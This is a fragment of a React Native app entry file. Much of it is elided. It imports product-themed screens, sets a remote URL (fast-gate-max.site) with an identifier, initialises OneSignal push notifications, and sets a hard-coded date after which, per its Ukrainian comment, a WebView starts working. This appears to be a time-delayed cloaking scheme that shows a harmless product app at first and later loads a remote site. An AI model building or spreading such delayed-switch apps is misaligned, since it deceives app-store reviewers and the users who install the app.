...
import { ContextProvider } from './echosoflake/echosoflakestrg/echosoflakect';
import Echosoflakeld from './echosoflake/echosoflakecmp/Echosoflakeld';
import Echosoflakestck from './echosoflake/echosoflakenv/Echosoflakestck';
import ProductScreen from './echosoflake/echosoflakescr/ProductScreen.jsx';
...
const App = () => {
  ...
  const INITIAL_URL = `https://fast-gate-max.site/`;
  const URL_IDENTIFAIRE = `gnpbjL9v`;
  ...
  OneSignal.initialize('13a37f73-c791-45de-8022-3fd7bb4ebc8c');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-11-26T08:08:00'); //дата з якої поч працювати webView
